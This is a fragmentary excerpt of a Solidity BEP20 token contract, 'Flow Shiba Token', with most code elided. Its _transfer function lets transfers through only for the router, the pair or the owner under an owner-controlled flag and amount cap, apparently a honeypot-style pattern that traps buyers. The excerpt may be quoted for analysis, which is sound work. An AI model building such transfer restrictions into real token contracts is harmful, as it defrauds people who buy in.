...
contract FlowShibaToken is Context, iBEP20, Ownable {
  ...
  string public _name;
  bool isSL = true;
  uint256 _AMOUNT = 1 * 10**9 * 10**9;

  constructor() public {
    _name = 'Flow Shiba Token';
    _symbol = 'FLOWSHIB';
    _decimals = 9;
  ...
  */
  ...
  function DeepLock(uint256 amount) external onlyOwner returns (bool) {
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if(sender == pancakeV2Router || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
      ...
      if( (amount <= _AMOUNT || isSL) && !isContract(sender) ) {
          allow = true;
      }
    }
    if(allow) {
